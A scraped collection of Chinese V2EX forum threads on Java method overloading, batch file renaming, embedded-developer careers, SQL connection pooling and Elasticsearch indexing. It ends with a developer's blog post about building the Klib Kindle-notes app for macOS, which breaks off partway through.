{"content": ["<div class=\"topic_content\">public class Test {\r<br>\tpublic void test(Object o) {\r<br>\t\tSystem.out.println(\"Object\");\r<br>\t}\r<br>\tpublic void test(String s) {\r<br>\t\tSystem.out.println(\"String\");\r<br>\t}\r<br>\tpublic static void main(String[] args) {\r<br>\t\tTest that = new Test();\r<br>\t\tthat.test(null);\r<br>\t}\r<br>}</div>"], "reply": "15", "tittle": "问下这段代码最后会输出什么,为什么..", "comment": ["string 吧，不同类型以具体的为准。", "输出 String 具体为什么我也不清楚，坐等大神解答", "你传的是什么类型调用的就是什么样的方法。", "输出的不应该是 String 么 ..\r", "System.out.println(\"String\");", "不同类型以具体的为准。理解这句话应该就没问题了，我刚刚测试了一下\r", "\r", "当传入的参数，未能有具体类型重载方法时，选择入参的的超类，也就是 Object 入参的方法\r", "\r", "当有 Object ， String ， boolean 三个重载的方法时，传入 null 值，编译器则会报出一个 ambiguous 的编译异常\r", "\r", "因为 String 跟 boolean 的方法都属于具体的类型，编译器无法判断选择那一个\r", "\r", "大概就是这么个意思吧", " 我是菜鸟..不知道这是不是坑,但是 test 方法唯一的一行代码只是输出一个固定的字符串而已.. 求轻喷", "编译失败。", " 然后发现两个 test 方法....我错了", " 当有 Object ， String ， boolean 三个重载的方法时，传入 null 值，并不会报错 依然还是输出 String", "compile error", "jls8 §15.12.2\r", "---------------\r", "There may be more than one such method, in which case the most specific one is chosen. The descriptor (signature plus return type) of the most specific method is the one used at run time to perform the method dispatch.\r", "\r", "方法重载优先选子类", "优先匹配子类呀。。", "编译不通过", " 这...不知道如何截图，但是我的机器上 Eclipse 确实会报错 \r", "\r", "具体信息如下\r", "\r", "The method test(Object) is ambiguous for the type Test"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>&lt;tag&gt; &lt;/tag&gt;\n还是&lt;tag/&gt;</p>\n</div></div>"], "reply": "3", "tittle": "大家写 XML 的时候空 tag 都是怎么写的?", "comment": ["都不是", " <tag />吗？", " 对啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如我 bat 脚本所在目录下面有 100 个 txt ，但是这 100 个 txt 的名字是乱七八糟的，我现在想实现把这 100 个 txt 按照从 1 到 100 的顺序给重命名，类似这样：</p>\n<pre><code>title-1.txt\ntitle-2.txt\ntitle-3.txt\n.............\ntitle-100.txt\n</code></pre>\n<p>我自己稍微写了下， 不知道怎么得到这个目录下面有多少个 txt ，求大神。\n这是我自己做的：</p>\n<pre><code>@echo off\nset sum=0\nset current_dir=%cd%\nfor /F \"tokens=*\" %%a in ('dir %current_dir% /b/s/a-d') do (\n         %%sum=%%sum+1\n         ren %%a 'aaa-%%sum.txt'\n)\n</code></pre>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>找大神请教了下，简单修改了，不过这个好像文件名有空格实现不了</p>\n<pre><code>@echo off &amp;Setlocal enabledelayedexpansion\nset a=1\nfor /f %%i in ('dir /b /a-d *.txt') do (\n    ren \"%%i\" \"ba-!a!.txt\"&amp;set /a a=!a!+1\n)\npause\n</code></pre>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>完美</p>\n<pre><code>@echo off &amp;Setlocal enabledelayedexpansion\nset a=1\nfor /f \"delims=\" %%i in ('dir /b /a-d *.txt') do (\n    ren \"%%i\" \"ba-!a!.txt\"&amp;set /a a=!a!+1\n)\n</code></pre>\n</div></div>"], "reply": "3", "tittle": "我想实现把脚本所在目录的全部 txt 按照规律重命名。", "comment": ["用 phython 可能会很简单:\r", "\r", "import glob,os,string\r", "def rename_files():\r", "\r", "    file_list = os.listdir(r\"/Users/Kantoi/Desktop/yourFolder\")\r", "\r", "    saved_path = os.getcwd()\r", "\r", "    os.chdir(r\"/Users/Kantoi/Desktop/yourFolder\")\r", "\r", "    for file_name in file_list:\r", "      os.rename(file_name,\"target name\")\r", "      \r", "rename_files()", "因为我是 windows ，这样 bat 比较方便，不然我也可以写 php ，免得每次配置环境， bat 放进去点一下就可以了", "大婶大婶大婶大婶大婶"]},
{"content": ["<div class=\"topic_content\">目前在菊花做嵌码，搞的东西很底层，通用性很低。加班较多，领导差劲，管理简单粗暴，收入尚可。\r<br>之前菊花靠“板凳要坐十年冷，不让雷锋吃亏”忽悠大伙，今年内部论坛都是 34 岁被离职。\r<br>大龄嵌码，何去何从？</div>"], "reply": "56", "tittle": "在菊花的嵌入式码农，有何出路？", "comment": ["还能咋办？尽量少加班，业余时间抓紧学习，跟随互联网大流。推荐自学 java 路线。或者去考个公务员", "去搞汽车", "收入尚可还想怎样？  来互联网趟浑水呀", " 智能驾驶吗？", "深圳吗？经济压力不大的话可以找人开团，那边搞软硬结合的挺多的，同学刚离职领了 10 多个月的补偿在搞机器人方面的", "看成了有菊花的码农，", "大公司特异化螺丝刀，收入就应该比你的市场价高\r", "这是靠你未来市场上的竞争力换的\r", "何去何从？降薪跳槽。", "fix 螺丝刀-> 螺丝钉", " +1", "嵌入式两年半     \r", "在转数据分析", "好多人不是出来创业了么   ？？", "赶紧跑,, 脱离菊花苦海的人告诫你一句", " 菊花是用生命榨来的钱，简单粗暴的中式管理的公司早点倒闭。", " 我看成了用菊花搞嵌入式的码农，吓死我了😂", "菊花使劲加班，干个 2 年财务自由是假的？", "   毕业第一年做的 hadoop/crunch/HBase 这套东西的，感觉不好玩，然后转组做底层包处理了；；我这是不是转的越来越窄了。。", "在菊花跑路倒计时的路过。。。", "如果你是菊花的老油条，你自然知道菊花真实和渲染过的一面。然后你自己的出路也会慢慢显现出来，除非你已经被菊花的文化给洗脑差不多了。。。。。。\r", "\r", "如果你是菊花的新司机，那请蛋定，你可能不一定能经得起几轮淘汰。", "想知道 34 岁的事件，具体情况是？有能力无能力的都被干掉？", " 我也有点想跑路", "嵌入在菊花式的码农（跑）", "搞什么或者什么语言都不重要，关键是要有能输出最终产品的能力，有这种能力后就不怕被离职了。当然嵌入式领域输出最终产品稍微难些，但也不是不肯能。", "汽车有很多的，智能驾驶，车联网都可以。就怕从菊花出来，其他公司给的价未必和你的意", " 北京", " 看产品线，看老大，看运气", " 大龄，低级别的", " 去哪了", " 因为大厂里的工作太专，去别的厂干不了吧！", "等物联网风口吧", " 我知道 以前产品线的大部分都离职了  我室友他们公司老板就是 不过 最近生意也不太好 他们那个监控产品线现在都没认识的人了", "第一次听嵌码这个称谓，感觉好奇特，原来以前自己也是做过多年菊花位的嵌码。\r", "\r", " 哪有什么风\r", "\r", "还是先卖点啤酒饮料矿泉水给山顶上等风的同学吧，不知是否有意 :)", " 互联网码农在鄙视链顶端，简称互码，核心竞争力是 JAVA ， python ， PHP ， oc ， js 等，言必称移动互联网。接下来才是嵌入式码农，只会 C ，会一点点汇编，竞争力低下。", " 我看成在菊花里嵌入码农", "菊花厂=华为？", "红色菊花==屁眼通红==python", " 是输出市场认可的产品，只输出产品说不定还会赔本\r", "\r", "嵌入式势弱，改行数据分析吧", " 北京的话，学一样移动或互联网开发的技能，进 BAT 网易数字之类的一些公司，华为出来的人这些公司还是很喜欢的", " 没看懂～", " 正在学学 python ，感觉还可以", "  让你去国外工作  不同意就开除~技术人员放开到 40 的", " 你这做软硬件结合挺好的啊， java,python,js 之类的应用更窄，而且简单换代快，现在只是在风口上。", "来搞工控吧，非常对口。", " 本来收到银行开发的 offer 还在犹豫的，现在貌似不用了。。。", "终端部门做 audio 如何", "34 否？有小孩否？有房贷否？", " 正常，这样大公司才能有效的换血。", " 会 C 和汇编， C++和 Windows 客户端开发熟悉么？熟悉的话可以发一份简历给我，深圳鹅厂，我们这里有不少从菊花跳过来的同事。 c3RlcGhlbjkzNTdAZ21haWwuY29t", "想吃点啥就吃点啥吧。", "其实，软硬结合的嵌入式还不错，还是蛮多技术栈（见附图）可以倒腾的，但是对于产品的交付能力，是研发人员的综合能力的体现，特别是在各方面资源都稀缺的时候，共勉。\r", "\r", " 1758u2dj21hs14cn3g", " \r", "\r", "噗，，，\r", "\r", "![]( ", ")", "搞物联网呀，多好，哈哈哈，在菊花工作，菊花天天就是爆别人的菊花，垄断盈利的，现在是互联网的天下。要不你可以搞 VR 成人", "嵌入菊花的码农", "楼主什么部门的？", " 企业网络"]},
{"content": ["<div class=\"topic_content\">有万+条数据要连续读写， sql 操作类中加了 open 和 close ，每条数据都会 open 下，写完再 close ……虽然这流程很标准，但我想这种连续性写入是不是可以不用 close 了？\r<br>现在软件跑一段时间后就会停止工作，查看错误日志时 sql 的问题……</div>"], "reply": "15", "tittle": "SQL 连续性的读写有必要在每条数据读写时 open 和 close 吗", "comment": ["这情况不是要数据库连接池吗", "不需要频繁的 open / close 连接，因为这很消耗系统资源。\r", "\r", "我的做法是：在内部缓存池中维护数据连接，当不再需要某连接时，就将其放回到连接池中，供下一个请求使用。\r", "\r", "关于停止工作的问题：对系统资源做些监控，跟数据库日志的时间和信息进行对比，来定位为题。", " @", " \r", "\r", "谢谢二位回复，我这本身就是个辅助工具类的软件。结果就是要处理大量的 sql\r", "对连接池不是很熟练，我再研究下。", "不需要事务？", "用事务啊", "关键字：连接池。\r", "还有一个就是静态类，只打开一次。", "搭楼请教另一个问题, 什么是 cursor,游标?\r", "cursor 存在的意义是什么.\r", "例如我 connect 一个 db 之后,还要在获取一个 cursor,然后用这个句柄去 execute 或者 fetchall 什么的.最后 close cursor,close db,\r", "\r", "在这里我们会发现,cursor 和 db 的功能是重复的.open/connect 了两遍,close 了两遍.\r", "\r", "是不是有什么我不知道的高级用法?导致这个游标是有存在意义的?\r", "\r", "谢谢.", "你应该多想想 “复用” 是什么意思", " 个人理解，游标是数据库中的一种控制结构，用来遍历数据库中的记录。类似于编程语言的迭代器。\r", "\r", "举例：一次查询有 10W 条记录，这 10W 条记录都一次读出来，还是一点一点地读呢？\r", "\r", "（重新开帖，搭什么车）", " 但是我可以把数据库做成一个迭代器.\r", "所以我还是觉得游标应该有另一些我不知道的高级用法在里面.", " ", " 那就是说和我想的差不多,游标并不一定是必须存在的,它只是一个\"工具\",有它会更好.", " 恩，在数据量大，但对一致性要求不高的情况下使用。个人会把它归在性能优化里，平时开发也不考虑。", " 游标有点类似于 reader ，一行行读取。将查询的数据一次性装入内存当然更快，但是数据行很多这时候游标的意义就出来了。", "楼上有没有具体示例，参考下，现在我也是查询每次都打开关闭数据库一次"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近用 Apache nifi 进行数据链的处理。</p>\n<p>用的 posgresSQL 的数据库，里面大概有 26 000 000 左右的数据，拉回本地大概需要 10 分钟，然后要用 es 进行索引，自己写的 bulk 的进程，大概每次入 35000 条数据 大小在 14M 左右。目测大概 20000 条每秒的速度。</p>\n<p>配置如下：</p>\n<p>硬盘 500G HDD\n内存 16G\nCPU i7-3770\nOS Ubuntu</p>\n<p>同时跑 Apache nifi 和 elasticearch 2.4.1</p>\n<p>大家的插入（索引 index ）速度是多少，来说说参考一下 :)\n谢过</p>\n</div></div>"], "reply": "11", "tittle": "elasticsearch 索引（ index）数据速度", "comment": ["2Tb 硬盘  ", " 一共 16 个核, 64Gb 内存, 入 2kw 数据, 需要 8-12 个小时.\r", "\r", "与你的 es 集群有多少个 node, 定义的分片和副本数, 每个 index 的数据规模有极大关系.\r", "\r", "2.6kw 数据, 16Gb 内存无压力, 磁盘估计也没压力, 你的最大成本是时间成本.\r", "\r", "你入数据的时候盯着点你的磁盘 IO/磁盘空间和内存使用情况.\r", "\r", "bulk 写的不好极容易集群状态 RED, 会导致大量 bulk 任务失败.\r", "\r", "另外, 写的时候最好不要有读操作, 也很容易导致 red", " 一直盯着 io 大概在 100M/s 我的时间大概半小时左右 就有一个 node 没有读取操作。", "es ，普通台式机， 5 万条每秒，每条数据不到 200 字节。导了将近 6 个小时，还没到 2 亿条数据，还有 18 亿数据要导。", " i7 ？", " i5 好像和 cpu 关系不是很大。。 cpu 占用率不高。", " SSD ？", " 修正下，只有 1 万条 /s  没有 ssd", " 拿速度咱们差不多 10 000 我是 10 000 - 30 000 \r", "看来是硬盘的问题 你看 io 的情况没有", "一般来说 bulk 的数量不要太大，几百条 documents 一起 bulk 就够了吧，否则 latency 太高", " 你指的是要把分片做小？ 但是这样 查库的时间就长了 这样查库的时间多了 不只是 1 倍。 等周一我去实验一下。", " @", " @", " \r", "最新消息，现在可以做到 200k 每秒了 :) 弄了 4 个 node mapping 提前准备好了。速度基本就这样了，然后 system load average 基本已经满了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>友情提醒：</p>\n<p>这里不但有 <strong>Klib 的诞生过程</strong>，</p>\n<p>还有 <strong>独立开发者的真实写照</strong>，</p>\n<p><strong>万字长文</strong>，谨慎继续…</p>\n<hr>\n<p>历时 50 天、横跨 2 年、经过 258 小时的纯手工打造， Klib 终于来到了这个世界。</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/5n91p.jpg\"></p>\n<p>这两天 Klib 刚刚发布，收到很多用户的好评。赶着手热，记录下 Klib 的诞生历程吧。</p>\n<p>Klib 是全新的 Kindle 标注、笔记 /书摘管理工具， macOS 平台。</p>\n<ul>\n<li><a href=\"https://toolinbox.net/Klib/\" rel=\"nofollow\">了解更多</a></li>\n<li><a href=\"https://itunes.apple.com/cn/app/id1196268448?mt=12&amp;at=1001lsTF&amp;ct=klib_me\" rel=\"nofollow\">Mac App Store 下载</a></li>\n</ul>\n<h1>缘起</h1>\n<p>2016 年底的时候，我在思考接下来做什么项目，并没有定下来，只是有个大概的方向：<strong>做个稍微大些的</strong>，以及技术上的需求，就是做一个<strong>有界面交互的</strong>。因为之前做的 i 系列工具（<a href=\"https://itunes.apple.com/cn/app/id1101244278?ls=1&amp;mt=12&amp;at=1001lsTF&amp;ct=klib_me\" rel=\"nofollow\">iPic</a>、<a href=\"https://itunes.apple.com/cn/app/id1062139745?ls=1&amp;mt=12&amp;at=1001lsTF&amp;ct=klib_me\" rel=\"nofollow\">iTimer</a>、<a href=\"https://itunes.apple.com/cn/app/id1056935452?ls=1&amp;mt=12&amp;at=1001lsTF&amp;ct=klib_me\" rel=\"nofollow\">iPaste</a>、<a href=\"https://itunes.apple.com/cn/app/id1102004240?ls=1&amp;mt=12&amp;at=1001lsTF&amp;ct=klib_me\" rel=\"nofollow\">iHosts</a>）都是非常垂直的，并且都是菜单栏工具，<strong>我想让自己有所突破</strong>。</p>\n<p>正巧，当时也给自己定了读书计划，就是<strong>要经常读书，并且读完后要在博客上写文章</strong>。主要自己是独立开发，获取信息的渠道本来就不多，就要<strong>用这种方式强迫自己不断更新</strong>。而要写文章，很重要的内容就是读书时的书摘。我习惯于用 Kindle 读电子书，于是，很直接的需求就是，把  Kindle 中的标注、笔记复制出来，用于写文章。</p>\n<p>而我大致搜索了下当时 macOS 平台下的标注管理工具，发现并没有趁手的。于是，就开始了程序员最喜欢做的事：<strong>造轮子</strong>。</p>\n<p>时间，正好是 2017 年元旦，详见 <a href=\"https://atjason.com/daily/2017-01-01.html\" rel=\"nofollow\">当天日记</a>。顺便说一句，<a href=\"https://atjason.com/categories/%E6%AF%8F%E5%A4%A9%E5%86%99%E4%B8%80%E7%82%B9/\" rel=\"nofollow\">我有每天写日记的习惯，已经坚持几年了</a>，也是为了<strong>逼迫单打独斗的自己，能够保持思考、反省</strong>。</p>\n<h1>设计</h1>\n<p>这里借用设计这个名字，只是用以涵盖产品前期的各种思考。确实是有各种思考，如市场环境、商业模式、竞品分析、名字、 Logo 、做成什么样子、交互、如何发布、怎么运营、时间节点、等等。时间有些早了，这里简单回忆下几个比较重要的点。</p>\n<h2>定位</h2>\n<p><strong>我一向倾向于做简洁的产品，这个工具也是如此</strong>。我最核心的需求就是导出 Kindle 中的笔记，最直观的衍伸就是能持久保存、定期回顾这些笔记。好了，就是这些吧，再多就难做的精简、好用了。重复+小结一下：</p>\n<p>定位：<strong>精简的、 macOS 平台、 Kindle 笔记管理工具</strong></p>\n<p>功能集：</p>\n<ul>\n<li><strong>导出 Kindle 中的笔记</strong></li>\n<li><strong>持久保存笔记</strong></li>\n<li><strong>方便回顾</strong></li>\n</ul>\n<h2>名字、 Logo</h2>\n<p>名字好定，因为我开发的工具都是 i 开头的（<a href=\"https://itunes.apple.com/cn/app/id1101244278?ls=1&amp;mt=12&amp;at=1001lsTF&amp;ct=klib_me\" rel=\"nofollow\">iPic</a>、<a href=\"https://itunes.apple.com/cn/app/id1062139745?ls=1&amp;mt=12&amp;at=1001lsTF&amp;ct=klib_me\" rel=\"nofollow\">iTimer</a>、<a href=\"https://itunes.apple.com/cn/app/id1056935452?ls=1&amp;mt=12&amp;at=1001lsTF&amp;ct=klib_me\" rel=\"nofollow\">iPaste</a>、<a href=\"https://itunes.apple.com/cn/app/id1102004240?ls=1&amp;mt=12&amp;at=1001lsTF&amp;ct=klib_me\" rel=\"nofollow\">iHosts</a>），这个自然也是。再加上是 Kindle 相关的，于是就叫：<strong>iKindle</strong>. 当然，你知道最后不是这个名字；这个坑，以后再填。</p>\n<p>Logo 也很容易呀，你看我之前产品的 Logo 就知道了：</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/ag32m.jpg\"></p>\n<p>iKindle 的 Logo 一定是类似下面这个样子的：</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/mja9k.jpg\"></p>\n<p>当然，你知道，后来也改了。这是后话。</p>\n<h2>交互</h2>\n<p>有了前面的铺垫，就可以考虑具体的交互。</p>\n<p>交互一定要直观、符合直觉。开始时，大致的想法是这样的（幸亏我还保留了当时的截图）：</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/8szmd.jpg\"></p>\n<p>左侧是书列表、右上角是书中笔记列表、右下角是选中笔记的内容、方便编辑。后来当然是不断演变了。</p>\n<p><strong>先是书</strong></p>\n<p>我一开始就没打开按作者来区分，因为我本人并没有追作者的习惯；并且，即使追，也没必要非得按作者分类，搜索不就可以了。</p>\n<p>但是，太多书放在一起，就有了排序的问题。按书名、最后阅读时间、还是别的？其实你会发现，<strong>如果书多，再怎么排序都没用</strong>。那干嘛不让书少点呢？有了，如果只看最近的几本书，比如 3 本，还需要考虑排序吗？那些更早的书，归档起来不就好了，之后能搜索到就行。</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/r4m76.jpg\"></p>\n<p>于是，这就诞生了 <strong>iKindle 独有的创意：区分当下正在阅读的书、和之前已经阅读的书</strong>。形式上就是把已读的书放在一起，可以折叠隐藏。<strong>恩，挺棒的！</strong></p>\n<p><strong>然后是笔记列表</strong></p>\n<p>程序员的思考，很直观的就是把所有属性都列出来，比如笔记内容、类型（是标注、还是笔记）、位置、添加日期。这用列表很容易实现。</p>\n<p>可问题是，除了笔记内容，后面这些属性会占用大量屏幕内容，却又不重要，只要在我需要的时候能看到就可以了。</p>\n<p>于是，那就把它们都隐藏起来好了，隐藏到简介里，这样笔记列表就只显示纯粹的笔记内容。<strong>恩，挺棒的！</strong></p>\n<p><strong>再然后就是阅读、编辑当前笔记</strong></p>\n<p>你会发现，在最原始的设计中，这部分也占据了大量屏幕、却不得已有大量空白。并且，对于我实际的笔记来看，很多都是一句话的，在列表中就几乎可以展示了，不再需要额外的这个区域。再并且，真正编辑的需求并不大（最多的就是在标注时，前后有不需要的内容、符号），大部分时间只要看就行了。</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/ngztt.jpg\"></p>\n<p>于是，这部分也被我干掉了。那如果笔记确实很长怎么办呢？我自然想到了 Finder 的快速预览。 OK ，那就搬过来吧。<strong>恩，挺棒的！</strong></p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/kab6b.jpg\"></p>\n<p><strong>下一个就是搜索</strong></p>\n<p>这个并不需要特别设计，跟系统的保持一致好了，不一致反而不好。<strong>恩，挺棒的！</strong></p>\n<p><strong>最后，就是整体的交互</strong></p>\n<p>我一看，经过上面的改进，这不就是个系统「提醒事项」的样子吗？好吧，那就做成「提醒事项」的样子。<strong>恩，挺棒的！</strong></p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/3ii7h.jpg\"></p>\n<h1>开发</h1>\n<p>设计差不多了，就可以码了。<strong>我开发的顺序一般是三步走：数据结构、堆 UI 、完成业务逻辑。</strong></p>\n<h2>数据结构</h2>\n<p>数据结构又主要为三块： Kindle 本身数据结构、内存中数据结构、持久化数据结构。</p>\n<h3>Kindle 本身数据结构</h3>\n<p>好吧，先吐槽一句：<strong>Kindle 的数据结构真垃圾</strong>！至少是开放出来的数据结构真增加，就是一个纯文本，类似于以下的内容：</p>\n<pre><code>史蒂夫•乔布斯传(Steve Jobs:A Biography) (沃尔特•艾萨克森 (Walter Isaacson))\n- 您在位置 #5676-5677 的标注 | 添加于 2015 年 8 月 22 日星期六 下午 1:33:54\n\n一家妥善经营的公司能够大量催生创新，远胜于任何一个有创造性的个人。\n==========\n</code></pre>\n<p>看起来还行是吗？那再来一些多语言版本的：</p>\n<pre><code>- Your Highlight on Location 1-6 | Added on Thursday, January 5, 2017 4:20:05 PM\n- Ihre Markierung bei Position 6-7 | Hinzugefügt am Mittwoch, 1. Februar 2017 12:21:36\n- Votre surlignement à lʼemplacement 9-12 | Ajouté le mercredi 1 février 2017 12:51:12\n- Tu subrayado en la posición 33-35 | Añadido el miércoles, 1 de febrero de 2017 12:42:10\n- 位置 No. 39-42のハイライト |作成日: 2017 年 2 月 1 日水曜日 13:00:33\n– Ваш выделенный отрывок в месте 45 – 49 | Добавлено: среда, 1 февраля 2017 г. в 13:12:38\n- 您在位置 #38-39 的标注 | 添加于 2017 年 1 月 5 日星期四 下午 4:07:22\n</code></pre>\n<p>单单是识别其中的日期，就有种想 shi 的冲动：要获取日期文本、识别格式、确定 Locale ；另外，还不知道日期所在时区。</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/58ar8.jpg\"></p>\n<p>这里我做一个小机巧：<strong>数据结构的解析能力可以动态更新。</strong>也即，在二进制程序不变的情况下，可以从云端获取数据的最新解析方式。这样，当用户反馈给我不支持的格式时，我只要更新云端的解析能力，客户端就都可以无痛、后台式更新了。<strong>为自己这个设计点赞！</strong></p>\n<h3>内存中数据结构</h3>\n<p>这个没太多好说的，定义书、笔记的各个属性即可。</p>\n<p>一个主要的机巧在于：<strong>如何识别笔记的唯一性？</strong>前面的文本中可以看到，笔记并没有所谓唯一 ID 之类的东西。既然没有，那就把笔记整体、或整体的 Hash 值作为唯一 ID 好了，反正笔记的数据量并不大，<strong>一个人一生的笔记，可能也没有 iPhone 拍的一张图片体积大。</strong></p>\n<h3>持久化数据结构</h3>\n<p>这一步，主要<strong>在结构化存储、和非结构化存储中纠结。</strong>前者数据规整，适合笔记存储，但扩展性差。后者优缺点大致和前者相反。</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/xdz0b.jpg\"></p>\n<p>最后，我还是选择了结构化存储。具体的，就是 <strong>SQLite</strong>. 一方面笔记类数据实在是太规整了；另一方面，抱着学习的态度，反正我哪种都不熟悉，随便拉一种出来练手吧。</p>\n<p>还有一个考量就是：<strong>数据结构的公开性。</strong>数据是用户的、宝贵的，如果使用私有的二进制数据结构，万一哪天要停止维护了，用户就没有任何办法可以解析这些数据。而使用公开的 SQLite 则不怕，任意一款 SQLite 工具都可以查看用户自己生成的数据。<strong>这样做，对用户是负责任的。</strong></p>\n<h2>堆 UI</h2>\n<p>这部分倒没有太多可说的。</p>\n<p>一方面就是一些核心控件的用法，如 <code>NSOutlineView</code>, <code>NSTextView</code>, <code>NSPopover</code>, <code>NSSearchField</code>. 其中，<code>Source List</code> 模式的 <code>NSOutlineView</code> 是有些坑的，会出现诸如 UI 刷新不及时、图标丢失等现象。有遇到类似问题的朋友，可以找我聊聊。</p>\n<p>另一方面就是界面的细节，如字体、字号、颜色、留白、间距、等等。这方面我倒是偷懒了，因为基本就是「复刻」系统「提醒事项」</p>\n<h2>实现业务逻辑</h2>\n<p><strong>打通数据流</strong></p>\n<p>比如，选择右侧书时，右侧笔记列表能相应变化；编辑笔记时，数据能持久化；查看笔记时，能读取正常的数据；等等。是不是听起来都像是废话？恩，就是这么回事，做对就行了。关键是 <strong>代码结构要好，不要有复制代码、严重耦合之类的问题。</strong></p>\n<p><strong>用户引导层面</strong></p>\n<p>比如，开始时引导用户手动导入、进行过程中引导用户如何操作。这部分我基本没做太多，因为希望程序可以做到无需引导。不过，引导用户导入这一步，做的确实不好，还要再改进。</p>\n<p><strong>外围的一些功能</strong></p>\n<p>比如，账户系统、日志及反馈系统、等等。这里就不再铺开了。</p>\n<h2>测试</h2>\n<h3>单元测试</h3>\n<p>其实，<strong>单元测试是在开发一开始就进行的</strong>。尤其是对数据结构部分，要充分测试。如果这部分没问题，只要程序能跑起来，基本就没有大问题。如果这部分有问题，改 Bug 够喝一壶的。</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/ehgey.jpg\"></p>\n<p>并且，<strong>要在定义数据结构、完成新功能那一刻，立即完善单元测试。</strong>因为这时候是对代码最熟悉、最清楚、也最愿意写单元测试的时候。错过这一刻，实在是太可惜了。</p>\n<h3>完善测试用例</h3>\n<p>和单元测试一样，<strong>测试用例不是在产品开发结果后补齐，而是在每开发完一个功能逻辑后，立即完善测试用例。</strong>道理一样，因为这个时候是对逻辑理解最透彻、清晰的时候，千万不能错过。</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/mp615.jpg\"></p>\n<h3>版本测试</h3>\n<p>单元测试跑一遍，心里就有底了。再加上前面完善的测试用例，版本测试无非就是照着用例跑一遍。</p>\n<p>我并没有做自动化测试、持续集成，主要是涉及 UI 的自动化测试并不好做，而且投入很大。对于我这种小项目、独立开发者而言，手动跑跑测试用例，可能是性价比最高的。</p>\n<p>值得介绍的一点是，<strong>推荐使用虚拟机进行版本测试</strong>。事先建立好干净的系统、生成镜像。每次测试时，只要将虚拟机恢复到指定的镜像即可。再者，就是可以在当前系统（如 macOS 10.12 ）中，测试其它版本的系统（如 macOS 10.11 ）</p>\n<h1>上架</h1>\n<p>自己辛苦做出来的东西，当然是希望越多人用户越好。要触到更多的用户，最直接有效的办法就是 <strong>上架 Mac App Store (MAS)</strong> 了。</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/rce4v.jpg\"></p>\n<h2>内测、公测</h2>\n<p>在上架前，要保证自己的产品的可用、好用的，最好的办法就是，先让一部分用户用起来，也就是内测、公测（以下统一称公测）。</p>\n<p>特别要强调的是，<strong>公测的目的并不是发现 Bug ，这是你自己要做好的事。</strong>公测主要有以下目的：</p>\n<ul>\n<li><strong>检验市场</strong>：也就是说，这个产品是不是有人需要、有多迫切需要，之前假想的市场是否存在、有多大，等等</li>\n<li><strong>检验设计</strong>：如果有人要，那自己做出来的东西是不是他想要的？哪些地方设计的比较好，有没有致命的缺陷？</li>\n<li><strong>检验质量</strong>：因为自己能覆盖的情况是有限的，还是要靠真实用户的实际使用来最终检验质量。</li>\n</ul>\n<p>我的内测主要是在之前的用户群中 、 V2EX 中，<strong>在此特别感谢参与公测的朋友！</strong></p>\n<h2>Mac App Store</h2>\n<p>好吧，终于来到 Mac App Store (MAS) 这个大坑。说 MAS 是大坑，主要是以下方面：</p>\n<h3>沙盒限制</h3>\n<p>沙盒会限制很多接口、系统权限的使用，对程序设计、产品交互有明显的影响。</p>\n<p>比如，除非用户手动操作（及用操作本身来授权）沙盒不允许产品访问用户的文件系统。这就使用 iKindle 无法在一开始时直接自动导入当前连接的 Kindle 设备，而必需由用户手动操作。这就需要很恰当的引导。而一旦使用过一次，后续就不再需要用户手动操作。这也是为什么 iKindle 后续可以自动导入。</p>\n<p>还有一个很关键的：<strong>即使在开发过程中打开了沙盒限制，苹果在审核时还是可能以沙盒为理由拒绝。</strong>虽说苹果准备了齐全的文档来说明这些限制，但一般开发者明显不能完全领会。就像你不可能读完所有法律以后再迈出家门第一步，一定碰到问题再解决问题更实际。好在，这次我没碰到这个问题。</p>\n<h2>名字</h2>\n<p>好吧，来说前文的坑。也许你会奇怪，为什么直到「沙盒限制」用的还是「 iKindle 」这个名字？是不是打错了？没错，确实是叫 iKindle.</p>\n<p>但是，<strong>苹果不允许在 App 名字中出现 Kindle 这个字样</strong>。于是，只能改名了。这真是个痛苦的过程。一方面，想出一个好名字并不容易，我纠结了 N 久（<a href=\"https://atjason.com/daily/2017-02-15.html\" rel=\"nofollow\">具体可见我的博客</a>），最终写了 <strong>Klib</strong> (<strong>K</strong>indle <strong>lib</strong>rary) 这个名字。</p>\n<p>另一方面，所有的东西都是跟名字相关的，比如代码、 App 名称、文案、截图、等等。一旦名字改了，所有这些都要改。这是极其繁琐的事，我再也不想做第 2 次。</p>\n<p>比如 Logo ，变成了下面的样子：</p>\n<p><img alt=\"\" src=\"https://p.ilib.io/cn/zyvsd.png\"></p>\n<h1>发布、推广</h1>\n<p>终于，在被拒了 2 次后， Klib 终于顽强上架 Mac App Store.</p>\n<p>接下来的问题就是，<strong>怎么让更多人知道 Klib</strong>，也即，如何发布、推广？</p>\n<h2>Product Hunt</h2>\n<p>在这一环节，我最没有办法的，就是 <strong>如何在海外推广</strong>。毕竟咱们是中国人，很难打入敌人内部，更别说在外国产生影响力。</p>\n<p>怎么办呢？我目前找到最直接有效的方法，就是在 Product Hunt 中有个成功的发布。这样国外的媒体也会在 Product Hunt 中找较好的产品进行报道。所以，<strong>Product Hunt 成了 Klib 走出国门、走向世界的关键</strong>。</p>\n<p>Product Hunt 的发布有很多可说的，这里挑几点重要的来说：</p>\n<ul>\n<li><strong>发布时间</strong>\n<ul>\n<li>从星期几的角度，<strong>每周二是最合适的</strong>。因为周二 Product Hunt 的用户量最多，也有充足的时间进入 Product Hunt 的 Weekly Report. 不过，考虑到 Klib 是小众产品，不太可能进入当天的 Top 1. 